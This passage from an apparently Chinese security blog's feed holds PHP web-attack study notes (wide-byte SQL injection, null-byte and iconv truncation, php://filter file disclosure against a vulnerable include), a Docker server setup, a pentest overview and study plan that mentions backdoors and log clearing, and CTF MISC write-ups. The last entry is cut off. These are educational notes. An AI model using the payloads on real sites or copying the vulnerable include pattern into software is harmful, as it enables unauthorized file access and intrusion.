id=&#x27;&quot;.urldecode(&quot;-1%df%5c&#x27; == &quot;).&quot;&#x27;&quot;; print_r(mb_convert_encoding($sql,&quot;UTF-8&quot;,&quot;GBK&quot;)); ?&gt;</span><br></pre></td></tr></table></figure><p>(2)字符串问题：</p><p>● 利用报错，找到敏感信息</p><h2 id="字符串截断"><a href="#字符串截断" class="headerlink" title="字符串截断"></a>字符串截断</h2><p>%00空字符截断：【PHP版本小于5.3】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;].&#x27;.php&#x27;);</span><br><span class="line"></span><br><span class="line">//1.php?file=2.txt%00</span><br><span class="line"></span><br><span class="line">//2.txt里面是 &lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="iconv函数字符编码转换截断：【对PHP版本有要求】"><a href="#iconv函数字符编码转换截断：【对PHP版本有要求】" class="headerlink" title="iconv函数字符编码转换截断：【对PHP版本有要求】"></a>iconv函数字符编码转换截断：【对PHP版本有要求】</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">chr(128)—chr(255)可以截断字符</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &#x27;1&#x27;.chr(130).&#x27;2’;</span><br><span class="line"></span><br><span class="line">echo $a.&quot;&lt;br&gt;&quot;; //12</span><br><span class="line"></span><br><span class="line">echo iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $a); //1</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php:&#x2F;&#x2F; 输入输出流"></a>php:&#x2F;&#x2F; 输入输出流</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[‘file&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode(内容被base64编码)&#x2F; resource&#x3D;example.txt(远程文件)</p><h2 id="php代码解析标签"><a href="#php代码解析标签" class="headerlink" title="php代码解析标签"></a>php代码解析标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a &lt;script language=&quot;php&quot;&gt;…&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">b &lt;?…?&gt;：php3.0.4版本后可用</span><br><span class="line"></span><br><span class="line">c &lt;%…%&gt;：asp标签，需要asp_tags=on，默认是 oﬀ </span><br></pre></td></tr></table></figure><p>正则表达式：</p><p>a 没有使用^ 和 $ 限定匹配开始位置：</p><p>b 特殊字符未转义：</p><p>报错注入：</p><p>windows findfirstfile<br>利用：<br>若要搜索12345.txt文件，可使用1&lt;&lt;来代替或者12&lt;&lt;，不可以单独使用一个”&lt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Setting Up an Intranet Server Using Docker</title>
      <link href="/2019/05/14/Setting-Up-an-Intranet-Server-Using-Docker/"/>
      <url>/2019/05/14/Setting-Up-an-Intranet-Server-Using-Docker/</url>
      
        <content type="html"><![CDATA[<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="几条重要的命令"><a href="#几条重要的命令" class="headerlink" title="几条重要的命令"></a>几条重要的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动           systemctl start docker</span><br><span class="line">守护进程重启 sudo systemctl daemon-reload</span><br><span class="line">列出容器        docker ps </span><br><span class="line">显示所有的容器，包括未运行的  docker ps -a</span><br><span class="line">重启docker服务  systemctl restart  docker</span><br><span class="line">重启docker服务  sudo service docker restart</span><br><span class="line">关闭docker      service docker stop   </span><br><span class="line">关闭docker      systemctl stop docker</span><br></pre></td></tr></table></figure><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><h4 id="通过桥接模式，搭建可通过外网访问的内网服务器"><a href="#通过桥接模式，搭建可通过外网访问的内网服务器" class="headerlink" title="通过桥接模式，搭建可通过外网访问的内网服务器"></a>通过桥接模式，搭建可通过外网访问的内网服务器</h4><p><strong>步骤</strong></p><ol><li>在 kali 中安装 docker</li><li>docker pull 下载镜像</li><li>配置静态ip</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ifconfig 查看当前网卡</span><br><span class="line">service networking stop 停止当前网卡网络服务</span><br><span class="line">vi /etc/network/interfaces 对网卡配置进行修改</span><br><span class="line">进去之后，你会发现这个界面内容</span><br><span class="line">································</span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0 网卡</span><br><span class="line">#iface eth0 inet dhcp</span><br><span class="line">iface eth0 inet static  启用静态ip</span><br><span class="line">address 192.168.31.108  设置ip地址</span><br><span class="line">netmask 255.255.255.0   子网掩码</span><br><span class="line">gateway 192.168.31.1    网关</span><br><span class="line">·······························</span><br><span class="line">ESC :wq!</span><br><span class="line">service networking restart 重启网络服务</span><br></pre></td></tr></table></figure><p>4.虚拟机本地访问127.0.0.1测试<br>5.改防火墙权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ufw</span><br><span class="line">关闭  ufw disable</span><br><span class="line">开启  ufw enable</span><br></pre></td></tr></table></figure><p>6.连接ssh，down源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssh hostname@ip -p xxxx 端口指向</span><br><span class="line">进入www目录（举例）</span><br><span class="line">cd /var/www/html</span><br><span class="line">打包html</span><br><span class="line">tar -cvf html.tar html </span><br><span class="line">移动html.tar到html</span><br><span class="line">mv html.tar html</span><br><span class="line">删除</span><br><span class="line">rm -f  强行删除某个文件</span><br><span class="line">rm -r  向下递归，不管有多少级目录，一并删除</span><br><span class="line">rm -rf 将会删除目录以及其下所有文件、文件夹</span><br><span class="line">访问ip/html.tar即可下载</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Penetration Testing</title>
      <link href="/2019/05/14/Introduction-to-Penetration-Testing/"/>
      <url>/2019/05/14/Introduction-to-Penetration-Testing/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h2><h3 id="基于百度搜索引擎得到的结果"><a href="#基于百度搜索引擎得到的结果" class="headerlink" title="基于百度搜索引擎得到的结果"></a>基于百度搜索引擎得到的结果</h3><p>渗透测试（Penetration Test）是一种黑盒安全测试方法，安全专家通过模拟真实黑客的技术手段对目标进行漏洞检测，突破系统的安全防护手段，深入评估漏洞所可能造成的实际影响。</p><h2 id="渗透测试与入侵的区别"><a href="#渗透测试与入侵的区别" class="headerlink" title="渗透测试与入侵的区别"></a>渗透测试与入侵的区别</h2><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>以安全为基本原则，通过攻击者以及防御者的角度去分析目标所存在的安全隐患以及脆弱性，以保护系统安全为最终目标。</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>通过各种方法，甚至破坏性的操作，来获取系统权限以及各种敏感信息。</p><h3 id="一般的渗透测试流程：-基于Freebuf"><a href="#一般的渗透测试流程：-基于Freebuf" class="headerlink" title="一般的渗透测试流程：(基于Freebuf)"></a>一般的渗透测试流程：(基于Freebuf)</h3><p>1.明确目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">确定范围：测试目标的范围、ip、域名、内外网、测试账户。</span><br><span class="line"></span><br><span class="line">确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。</span><br><span class="line"></span><br><span class="line">确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞、等等。</span><br></pre></td></tr></table></figure><p>2.信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">方式：主动扫描，开放搜索等。</span><br><span class="line"></span><br><span class="line">开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。</span><br><span class="line"></span><br><span class="line">基础信息：IP、网段、域名、端口。</span><br><span class="line"></span><br><span class="line">应用信息：各端口的应用。例如web应用、邮件应用、等等。</span><br><span class="line"></span><br><span class="line">系统信息：操作系统版本</span><br><span class="line"></span><br><span class="line">版本信息：所有这些探测到的东西的版本。</span><br><span class="line"></span><br><span class="line">服务信息：中间件的各类信息，插件信息。</span><br><span class="line"></span><br><span class="line">人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。</span><br><span class="line"></span><br><span class="line">防护信息：试着看能否探测到防护设备。</span><br></pre></td></tr></table></figure><p>3.漏洞探测</p><p>利用上一步中列出的各种系统，应用等使用相应的漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line"></span><br><span class="line">(1)   漏扫，awvs，IBM appscan等。</span><br><span class="line"></span><br><span class="line">(2)   结合漏洞去exploit-db等位置找利用。</span><br><span class="line"></span><br><span class="line">(3)   在网上寻找验证poc。</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line"></span><br><span class="line">系统漏洞：系统没有及时打补丁</span><br><span class="line"></span><br><span class="line">WebSever漏洞：WebSever配置问题</span><br><span class="line"></span><br><span class="line">Web应用漏洞：Web应用开发问题</span><br><span class="line"></span><br><span class="line">其它端口服务漏洞：各种21/8080(st2)/7001/22/3389</span><br><span class="line"></span><br><span class="line">通信安全：明文传输，token在cookie中传送等。</span><br></pre></td></tr></table></figure><p>4.漏洞验证</p><p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">自动化验证：结合自动化扫描工具提供的结果</span><br><span class="line"></span><br><span class="line">手工验证，根据公开资源进行验证</span><br><span class="line"></span><br><span class="line">试验验证：自己搭建模拟环境进行验证</span><br><span class="line"></span><br><span class="line">登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</span><br><span class="line"></span><br><span class="line">业务漏洞验证：如发现业务漏洞，要进行验证</span><br></pre></td></tr></table></figure><p>公开资源的利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exploit-db/wooyun/</span><br><span class="line"></span><br><span class="line">google hacking</span><br><span class="line"></span><br><span class="line">渗透代码网站</span><br><span class="line"></span><br><span class="line">通用、缺省口令</span><br><span class="line"></span><br><span class="line">厂商的漏洞警告等等。</span><br></pre></td></tr></table></figure><p>5.信息分析<br>为下一步实施渗透做准备。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">精准打击：准备好上一步探测到的漏洞的exp，用来精准打击</span><br><span class="line"></span><br><span class="line">绕过防御机制：是否有防火墙等设备，如何绕过</span><br><span class="line"></span><br><span class="line">定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</span><br><span class="line"></span><br><span class="line">绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</span><br><span class="line"></span><br><span class="line">攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</span><br></pre></td></tr></table></figure><p>6.获取所需<br>实施攻击：根据前几步的结果，进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</span><br><span class="line"></span><br><span class="line">进一步渗透：内网入侵，敏感目标</span><br><span class="line"></span><br><span class="line">持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</span><br><span class="line"></span><br><span class="line">清理痕迹：清理相关日志（访问，操作），上传文件等</span><br></pre></td></tr></table></figure><p>7.信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整理渗透工具：整理渗透过程中用到的代码，poc，exp等</span><br><span class="line"></span><br><span class="line">整理收集信息：整理渗透过程中收集到的一切信息</span><br><span class="line"></span><br><span class="line">整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</span><br></pre></td></tr></table></figure><p>8.形成报告</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</span><br><span class="line"></span><br><span class="line">补充介绍：要对漏洞成因，验证过程和带来危害进行分析</span><br><span class="line"></span><br><span class="line">修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</span><br></pre></td></tr></table></figure><h3 id="学习规划-基于CnHacker"><a href="#学习规划-基于CnHacker" class="headerlink" title="学习规划: (基于CnHacker)"></a>学习规划: (基于CnHacker)</h3><p>基础：Web安全相关概念</p><blockquote><p>熟悉基本概念（SQL注入、上传、XSS、CSRF、一句话木马等）.</p></blockquote><blockquote><p>通过关键字（SQL注入、上传、XSS、CSRF、一句话木马等）进行Google&#x2F;SecWiki；</p></blockquote><blockquote><p>阅读《精通脚本黑客》，虽然很旧也有错误，但是入门还是可以的；</p></blockquote><blockquote><p>看一些渗透笔记&#x2F;视频，了解渗透实战的整个过程，可以Google（渗透笔记、渗透过程、入侵过程等）；</p></blockquote><p>3周<br>熟悉渗透相关工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">熟悉AWVS、sqlmap、Burp、nessus、chopper、nmap、Appscan等相关工具的使用。</span><br><span class="line">了解该类工具的用途和使用场景，先用软件名字Google/SecWiki；</span><br><span class="line">下载无后们版的这些软件进行安装；</span><br><span class="line">学习并进行使用，具体教材可以在SecWiki上搜索，例如：Brup的教程、sqlmap；</span><br><span class="line">待常用的这几个软件都学会了可以安装音速启动做一个渗透工具箱；</span><br></pre></td></tr></table></figure><p>5周<br>渗透实战操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">掌握渗透的整个阶段并能够独立渗透小型站点。</span><br><span class="line">网上找渗透视频看并思考其中的思路和原理，关键字（渗透、SQL注入视频、文件上传入侵、数据库备份、dedecms漏洞利用等等）；</span><br><span class="line">自己找站点/搭建测试环境进行测试，记住请隐藏好你自己；</span><br><span class="line">思考渗透主要分为几个阶段，每个阶段需要做那些工作，例如这个：PTES渗透测试执行标准；</span><br><span class="line">研究SQL注入的种类、注入原理、手动注入技巧；</span><br><span class="line">研究文件上传的原理，如何进行截断、双重后缀欺骗(IIS、PHP)、解析漏洞利用（IIS、Nignix、Apache）等，参照：上传攻击框架；</span><br><span class="line">研究XSS形成的原理和种类，具体学习方法可以Google/SecWiki，可以参考：XSS；</span><br><span class="line">研究Windows/Linux提权的方法和具体使用，可以参考：提权；</span><br><span class="line">可以参考: 开源渗透测试脆弱系统；</span><br></pre></td></tr></table></figure><p>1周<br>关注安全圈动态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">关注安全圈的最新漏洞、安全事件与技术文章。</span><br><span class="line">通过SecWiki浏览每日的安全技术文章/事件；</span><br><span class="line">通过Weibo/twitter关注安全圈的从业人员（遇到大牛的关注或者好友果断关注），天天抽时间刷一下；</span><br><span class="line">通过feedly/鲜果订阅国内外安全技术博客（不要仅限于国内，平时多注意积累），没有订阅源的可以看一下SecWiki的聚合栏目；</span><br><span class="line">养成习惯，每天主动提交安全技术文章链接到SecWiki进行积淀；</span><br><span class="line">多关注下最新漏洞列表，推荐几个：exploit-db、CVE中文库、Wooyun等，遇到公开的漏洞都去实践下。</span><br><span class="line">关注国内国际上的安全会议的议题或者录像，推荐SecWiki-Conference。</span><br></pre></td></tr></table></figure><p>3周<br>熟悉Windows&#x2F;Kali Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">学习Windows/Kali Linux基本命令、常用工具；</span><br><span class="line">熟悉Windows下的常用的cmd命令，例如：ipconfig,nslookup,tracert,net,tasklist,taskkill等；</span><br><span class="line">熟悉Linux下的常用命令，例如：ifconfig,ls,cp,mv,vi,wget,service,sudo等；</span><br><span class="line">熟悉Kali Linux系统下的常用工具，可以参考SecWiki,《Web Penetration Testing with Kali Linux》、《Hacking with Kali》等；</span><br><span class="line">熟悉metasploit工具，可以参考SecWiki、《Metasploit渗透测试指南》。</span><br></pre></td></tr></table></figure><p>3周<br>服务器安全配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">学习服务器环境配置，并能通过思考发现配置存在的安全问题。</span><br><span class="line">Windows2003/2008环境下的IIS配置，特别注意配置安全和运行权限，可以参考：SecWiki-配置；</span><br><span class="line">Linux环境下的LAMP的安全配置，主要考虑运行权限、跨目录、文件夹权限等，可以参考：SecWiki-配置；</span><br><span class="line">远程系统加固，限制用户名和口令登陆，通过iptables限制端口；</span><br><span class="line">配置软件Waf加强系统安全，在服务器配置mod_security等系统，参见SecWiki-ModSecurity；</span><br><span class="line">通过Nessus软件对配置环境进行安全检测，发现未知安全威胁。</span><br></pre></td></tr></table></figure><p>4周<br>脚本编程学习</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">选择脚本语言Perl/Python/PHP/Go/Java中的一种，对常用库进行编程学习。</span><br><span class="line">搭建开发环境和选择IDE，PHP环境推荐Wamp和XAMPP，IDE强烈推荐Sublime，一些Sublime的技巧：SecWiki-Sublime；</span><br><span class="line">Python编程学习，学习内容包含：语法、正则、文件、网络、多线程等常用库，推荐《Python核心编程》，不要看完；</span><br><span class="line">用Python编写漏洞的exp，然后写一个简单的网络爬虫，可参见SecWiki-爬虫、视频；</span><br><span class="line">PHP基本语法学习并书写一个简单的博客系统，参见《PHP与MySQL程序设计（第4版）》、视频；</span><br><span class="line">熟悉MVC架构，并试着学习一个PHP框架或者Python框架（可选）；</span><br><span class="line">了解Bootstrap的布局或者CSS，可以参考：SecWiki-Bootstrap;</span><br></pre></td></tr></table></figure><p>3周 源码审计与漏洞分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">能独立分析脚本源码程序并发现安全问题。</span><br><span class="line">熟悉源码审计的动态和静态方法，并知道如何去分析程序，参见SecWiki-审计；</span><br><span class="line">从Wooyun上寻找开源程序的漏洞进行分析并试着自己分析；</span><br><span class="line">了解Web漏洞的形成原因，然后通过关键字进行查找分析，参见SecWiki-代码审计、高级PHP应用程序漏洞审核技术；</span><br><span class="line">研究Web漏洞形成原理和如何从源码层面避免该类漏洞，并整理成checklist。</span><br></pre></td></tr></table></figure><p>5周<br>安全体系设计与开发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">能建立自己的安全体系，并能提出一些安全建议或者系统架构。</span><br><span class="line">开发一些实用的安全小工具并开源，体现个人实力；</span><br><span class="line">建立自己的安全体系，对公司安全有自己的一些认识和见解；</span><br><span class="line">提出或者加入大型安全系统的架构或者开发；</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC 2019-MISC</title>
      <link href="/2019/05/14/ISCC2019-MISC/"/>
      <url>/2019/05/14/ISCC2019-MISC/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>进制——&gt;ASCII——&gt;base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113&#x27;</span></span><br><span class="line">tmp = <span class="built_in">str</span>.split( )</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>StegSolve——&gt;data analyze——&gt;字符颠倒<br><a href="https://i.loli.net/2019/05/06/5ccfd01f95d4e.png" title="倒立屋"><img src="https://i.loli.net/2019/05/06/5ccfd01f95d4e.png" alt="倒立屋" title="倒立屋"></a><br>将图片在Steg中数据分析调至最低位，会发现第一行有一串很像flag的字符，尝试提交报错，更改格式报错，再结合题目，倒立屋，尝试将字符串颠倒过来提交，即按从右往左的顺序，发现对了（这道题的flag有点东西）</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>提取——&gt;联想——&gt;比划<br>在附件中我们发现有{}，不难猜到肯定是flag，我们进行提取得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU&#125;</span><br></pre></td></tr></table></figure><p>这么长一串，但是看起来又不像加密过的，回到原题“Keyes’ secret”，联想一下,key会不会是keyboard,再观察提取的字符，突然发现这些字母连起来在键盘上画出来是会是其他的字母形状，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WSX----------------------I</span><br><span class="line">IUYHNBV---------------S</span><br><span class="line">TRFVB------------------C</span><br><span class="line">QAZSEC----------------K</span><br><span class="line">WSXCDE---------------E</span><br><span class="line">EFVT---------------------Y</span><br><span class="line">YHNMKJ----------------B</span><br><span class="line">TGBNMJU--------------O</span><br><span class="line">GRDXCVB--------------A</span><br><span class="line">MNBVCDRTGHU-----R</span><br><span class="line">WSXCFE----------------D</span><br><span class="line">NBVCXSWERF--------P</span><br><span class="line">RFVGYHN--------------H</span><br><span class="line">MNBVCDRTGHU-----R</span><br></pre></td></tr></table></figure><p>以上就是键盘中的秘密</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>题目——&gt;winhex——&gt;AES+key解密<br>观察题目有三个比较敏感的字母AES，不难猜到这道题是AES解码，既然解码就要找到密文，故我们将GIF动图放到winhex中，发现最低端有一行特立独行的密文，<a href="https://i.loli.net/2019/05/06/5ccfd67f8f4a4.png" title="winhex"><img src="https://i.loli.net/2019/05/06/5ccfd67f8f4a4.png" alt="winhex" title="winhex"></a><br>进行解码，发现需要提供key,猜想这是什么比赛，哦,ISCC，尝试设置为ISCC，解码，<br><a href="https://i.loli.net/2019/05/06/5ccfd6b00c2cb.png" title="AES"><img src="https://i.loli.net/2019/05/06/5ccfd6b00c2cb.png" alt="AES" title="AES"></a>发现成功了，再次进行解码，得到flag</p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>binwalk——&gt;python3<br>用过很多信息隐藏提取的工具都没有用，经过尝试，发现binwalk可以将此图分离<br><a href="https://i.loli.net/2019/05/06/5cd035b040d11.png" title="binwalk"><img src="https://i.loli.net/2019/05/06/5cd035b040d11.png" alt="binwalk" title="binwalk"></a><br>得到10个碎片图<br>并且得到一张说明提示</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 